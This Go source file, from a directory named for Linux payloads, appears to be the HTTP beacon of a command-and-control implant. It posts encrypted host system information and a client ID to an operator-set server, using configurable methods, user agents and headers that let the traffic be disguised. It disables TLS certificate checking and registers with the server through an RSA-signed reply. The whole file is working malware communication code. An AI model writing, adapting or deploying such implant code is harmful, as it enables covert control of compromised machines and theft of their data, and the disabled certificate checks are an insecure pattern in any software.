// server/docker/payloads/Linux/http.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"time"
)

// PostData represents the structure of our post request body
type PostData struct {
	Data      string            `json:"data"`      // Our encrypted system info
	Metadata  map[string]string `json:"metadata"`  // Additional metadata
	Timestamp int64             `json:"timestamp"` // Current timestamp
}

type SignedResponse struct {
	Status             string `json:"status"`
	NewClientID        string `json:"new_client_id"`
	SecretsInitialized bool   `json:"secrets_initialized"`
	Signature          string `json:"signature"`
	Seed               string `json:"seed"`
}

// parseCustomHeaders converts the JSON string of custom headers into a map
func parseCustomHeaders(headerJSON string) (map[string]string, error) {
	headers := make(map[string]string)
	err := json.Unmarshal([]byte(headerJSON), &headers)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}
	return headers, nil
}

func sendInitialPost(url string, encryptedData string, decrypted map[string]string) (string, error) {
	// Get the custom POST method from decrypted values
	method := decrypted["POST Method"] // Ensure this matches exactly
	if method == "" {
		method = "POST"
	}

	// Create the post data structure
	postData := PostData{
		Data: encryptedData,
		Metadata: map[string]string{
			"id":         clientID,
			"encryption": "rsa+aes",
		},
		Timestamp: time.Now().Unix(),
	}

	// Convert post data to JSON
	jsonData, err := json.Marshal(postData)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Create the request with custom method
	req, err := http.NewRequest(method, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Parse and set custom headers
	customHeaders, err := parseCustomHeaders(decrypted["Custom Headers"])
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Set headers
	req.Header.Set("User-Agent", decrypted["User Agent"])
	req.Header.Set("Content-Type", decrypted["Content Type"])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Custom HTTP client
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: time.Second * 30}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer resp.Body.Close()

	// Read response body
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Parse the signed response
	var signedResponse SignedResponse
	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Verify the server's signature
	verificationData := fmt.Sprintf("%s:%s", signedResponse.NewClientID, signedResponse.Seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Parse server's public key
	block, _ := pem.Decode([]byte(decrypted["Public Key"]))
	if block == nil {
		return "", fmt.Errorf(Err(E18))
	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Decode signature
	signature, err := base64.StdEncoding.DecodeString(signedResponse.Signature)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Verify signature
	if err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature); err != nil {
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Return the new client ID if everything is verified
	if signedResponse.NewClientID == "" {
		return "", fmt.Errorf(Err(E18))
	}

	return signedResponse.NewClientID, nil
}
